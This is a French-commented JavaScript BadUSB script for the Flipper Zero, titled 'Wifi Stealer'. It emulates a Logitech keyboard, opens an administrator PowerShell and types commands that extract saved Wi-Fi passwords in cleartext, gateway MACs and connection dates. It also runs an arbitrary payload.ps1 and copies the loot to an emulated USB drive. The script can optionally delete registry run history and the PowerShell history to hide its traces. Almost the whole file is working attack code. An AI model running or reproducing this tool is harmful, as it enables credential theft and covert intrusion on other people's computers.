// Wifi Stealer BadUSB script
// Ce script ne fonctionne que si l'utilisateur connecté est administrateur de la machine
// Script Javascript pour Flipper Zero basé sur le travail de Jamison Derek et Miiraak
// Références : 
// - https://developer.flipper.net/flipperzero/doxygen/js.html
// - https://github.com/jamisonderek/flipper-zero-tutorials/wiki/JavaScript
// - https://github.com/Miiraak/FlipperZeroFR/tree/main/Info-Doc-Wiki/JavaScript

// Chargement des modules
print("[+] Chargement des modules");
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");
let eventLoop = require("event_loop");
let gui = require("gui");
let textBoxView = require("gui/text_box");


// ************
// Attention à ce que la langue pour le clavier soit correcte
// La liste de toutes les langues prises en charge est disponible ici : https://github.com/Next-Flip/Momentum-Firmware/tree/dev/applications/main/bad_kb/resources/badusb/assets/layouts
let layout = "fr-FR";

// Mettre à true pour supprimer les traces dans l'historique Powershell et dans la base de registre
let remove_artefacts = false;

// Fichier local sur le PC cible pour enregistrer les informations
let localTempFolder = "tempo";
let localFileName = "resultats.txt";

// Emplacement des données collectées sur le Flipper
let flipMassDir = "/ext/apps_data/mass_storage";
let lootFile = flipMassDir + "/wifi_result.txt";

let formatDate = "dd/MM/yyyy HH:mm:ss";

// Commandes à exécuter sur la cible
let script = [
  "date >> " + localFileName + ";",
  "$env:COMPUTERNAME >> " + localFileName + ";",
  "Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> " + localFileName + ";",
  "$rPp = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\';$rUp = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged';$r = @();$wP = netsh wlan show profiles | Select-String ':\s*(.+)$' | %{$_.Matches.Groups[1].Value};function dD {param ($rD);$dV = @();for ($i = 0; $i -lt $rD.Length; $i += 2) {$bP = $rD[$i..($i+1)];$hP = $bP | ForEach-Object { '{0:X2}' -f $_ };$iH = $hP[1] + $hP[0];$dVa = [convert]::ToInt32($iH, 16);$dV += $dVa};$y = $dV[0];$m = $dV[1];$d = $dV[3];$h = $dV[4];$mi = $dV[5];$s = $dV[6];$mil = $dV[7];if ($mil -gt 999) {$mil = 999};$dT = New-Object DateTime($y, $m, $d, $h, $mi, $s, $mil);$fD = $dT.ToString(\"" + formatDate + "\");return $fD};foreach ($p in $wP) {if ($p.length -gt 1) {$sk = '';(netsh wlan show profile name=$p key=clear) | Select-String '(Contenu|Key).*:(.+)$' | %{$sk = $_.Matches.Groups[2].Value.Trim()};$sKs = gci -Path $rUp;foreach ($sKe in $sKs) {$de = gp -Path $sKe.PSPath -Name 'Description' -ErrorAction SilentlyContinue;if ($de -and $de.Description -like '*'+$p+'*') {$dGM = gp -Path $sKe.PSPath -Name 'DefaultGatewayMac' -ErrorAction SilentlyContinue;if ($dGM) {$mH = ($dGM.DefaultGatewayMac | %{ '{0:X2}' -f $_ }) -join ':'}}};$sKsP = gci -Path $rPp;foreach ($sKeP in $sKsP) {$el = gp -Path $sKeP.PSPath -Name 'Description' -ErrorAction SilentlyContinue;if ($el -and $el.Description -like '*'+$p+'*') {$LDCR = '';$LDCR = (gp -Path $sKeP.PSPath -Name 'DateLastConnected' -ErrorAction SilentlyContinue).DateLastConnected;if ($LDCR) {$fD = dD($LDCR)};$FDCR = (gp -Path $sKeP.PSPath -Name 'DateCreated' -ErrorAction SilentlyContinue).DateCreated;if ($FDCR) {$fD2 = dD($FDCR)}}};$r += [PSCustomObject]@{SSID = $p;BSSID = $mH;Key = $sk;LastConnected = $fD;FirstConnected = $fD2}}};$r | Format-Table -AutoSize >> " + localFileName + ";",
  "cat " + localFileName + ";",
];

// Image pour stocker les charges malveillantes et les résultats
let exfilCapacityMb = 2; // 2 Mo réservés pour cette image
let image = flipMassDir + "/USB_" + exfilCapacityMb.toString() + "MB.img";
let flipperStorageName = "Flipper Mass Storage";

// Dossier et fichier pour stocker les résultats sur la carte SD
let resultFolder = "results";
let resultFileName = "info.txt";

print("[+] Verification si l'image existe deja");
if (storage.fileExists(image)) {
  storage.remove(image);
  print("[+] --- Image disque USB existante supprimee");
}
print("[+] Creation de la nouvelle image de cle USB...");
usbdisk.createImage(image, exfilCapacityMb * 1024 * 1024);

print("[+] Suppression du precedent fichier de resultat si il existe");
let result = storage.remove(lootFile);
if (!result) { print("[-] La suppression du fichier de resultat a echoue."); }

// Copie de la charge malveillante depuis la carte SD vers le lecteur USB
let copyPayload = true;
let playPayload = true;
let payloadName = "payload.ps1";
let payloadSrcName = flipMassDir + "/payloads/" + payloadName;
let payloadDstName = "/mnt/" + payloadName;

if (copyPayload) {
  print("[+] Chargement de l'image et copie de la charge utile dessus");
  storage.virtualInit(image);
  storage.virtualMount();
  storage.copy(payloadSrcName, payloadDstName);
  storage.virtualQuit();
}

print("[+] Exposition du flipper comme un clavier Logitech")
badusb.setup({
  vid: 0x046D,
  pid: 0xc33f,
  mfrName: "Logitec, Inc",
  prodName: "Keyboard",
  layoutPath: "/ext/badusb/assets/layouts/" + layout + ".kl"
});
print("[+] Attente de connexion du Flipper comme clavier");
while (!badusb.isConnected()) {
  delay(1000);
}

// Lancement de powershell en administrateur
print("[+] Lancement de powershell en administrateur");
delay(3000);
badusb.press("GUI", "x");
delay(500);
badusb.press("a");
delay(1500);

//////////////////////////
// Ajout pour Windows 11
badusb.press("LEFT");
delay(1500);
badusb.press("ENTER");
delay(3000);
//////////////////////////

print("[+] Execution des commandes");
badusb.println(" md " + localTempFolder + "; cd " + localTempFolder + "; ");
for (let i = 0; i < script.length; i++) {
  badusb.println(script[i]);
}


// Attente de la detection du flipper comme peripherique USB et recuperation de la lettre de lecteur associee ($DriveLetter)
print("[+] Recuperation de la lettre de lecteur du peripherique USB");
badusb.print(" $FlipperStorage = '" + flipperStorageName + "';");
badusb.print(" do {");
badusb.print(" Start-Sleep 1;");
badusb.print(" $Disks = Get-Disk;");
badusb.print(" $DiskNames = $Disks | Select-Object -Property Number,FriendlyName;");
badusb.print(" $DiskNumber = $DiskNames | Where-Object -FilterScript { ($_.FriendlyName) -eq $FlipperStorage} | Select-Object -ExpandProperty Number;");
badusb.print(" } while ($DiskNumber -lt 0);")
badusb.print(" $DriveLetter = Get-Partition -DiskNumber ${DiskNumber} | Select-Object -ExpandProperty DriveLetter;");
badusb.press("ENTER");

// Instant où le périphérique USB est monté
badusb.println("write-host La lettre de lecteur est $DriveLetter");

// Copie de la charge utile du disque USB vers le disque de la machine cible
if (copyPayload) {
  print("[+] Copie de la charge utile");
  badusb.print(" $Payload = ${DriveLetter} + ':\\" + payloadName + "';");
  badusb.println(" Copy-Item -Path $Payload;");
}

// Execute le payload
if (playPayload) {
  print("[+] Lancement de la charge utile");
  badusb.print(" $payload_path = Get-Location | Select-Object -ExpandProperty Path;");
  badusb.print(" $payload = $payload_path+'\\" + payloadName + "';")
  badusb.println(". $payload;");
}

// Deplacement du fichier de resultat sur la cle USB
print("[+] Copie du resultat des commandes dans un fichier sur la cle USB");
if (script.length > 0) {
  badusb.print(" $LocalFile = '" + localFileName + "';");
  badusb.print(" New-Item -ItemType Directory -Force -Path ${DriveLetter}:\\" + resultFolder + "\\;");
  badusb.print(" Get-Content $LocalFile | out-file -encoding ASCII ${DriveLetter}:\\" + resultFolder + "\\" + resultFileName + ";");
  badusb.println(" Start-Sleep 1;");
}


// Effacement des traces
print("[+] Effacement des traces");
badusb.print(" cd ..;");
badusb.print(" Remove-Item " + localTempFolder + " -Force -Recurse;");
if (remove_artefacts) {
	badusb.print(" reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f;");
	badusb.print(" Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue;");
}
badusb.press("ENTER");
delay(1500);



// Ejection du peripherique USB
print("[+] Ejection cle USB");
badusb.print(" $eject = New-Object -comObject Shell.Application;");
badusb.println(" $eject.Namespace(17).ParseName($DriveLetter+':').InvokeVerb('Eject');");

// Fermeture de la fenêtre et detachement du clavier 
badusb.press("ENTER");
badusb.println(" Start-Sleep 1; exit");
badusb.quit();


// Attachement du stockage
print("[+] Attachement du stockage...");
usbdisk.start(image);


// Attente de la fin de l'execution
print("[+] Attente de la fin de l'execution...");
delay(5000);

// Détachement du stockage
print("[+] Detachement du stockage...");
usbdisk.stop(image);
delay(5000);

// Attente que le script ejecte le stockage (commenter car plante le script)
// print("[+] Attente du detachement...");
// while (usbdisk.wasEjected()) {
  // print(".");
  // delay(1000);
// }

// Done
print("[+] Disque USB detache.");
delay(500);

let views = {
  longText: textBoxView.makeWith({
    text: "...",
  })
};

// Attente du bouton "Retour" pour sortir
eventLoop.subscribe(gui.viewDispatcher.navigation, function (_sub, _, eventLoop) {
  eventLoop.stop();
}, eventLoop);

// Montage et affichage de la sortie
if (script.length > 0) {
  print("[+] Lecture du resultat ...");
  storage.virtualInit(image);
  storage.virtualMount();
  delay(1000);

  let file = storage.openFile("/mnt/" + resultFolder + "/" + resultFileName, "r", "open_existing");
  let result = file.read("ascii", file.size());

  print("[+] Affichage des resultats.");
  views.longText.set("text", result);
  gui.viewDispatcher.switchTo(views.longText);
  eventLoop.run();

  print("[+] Ecriture en local du fichier de resultat.");
  let loot = storage.openFile(lootFile, "w", "open_append");
  loot.write("\n");
  loot.write(result);
  loot.close();

  storage.virtualQuit();
}

print("[+] Fin.");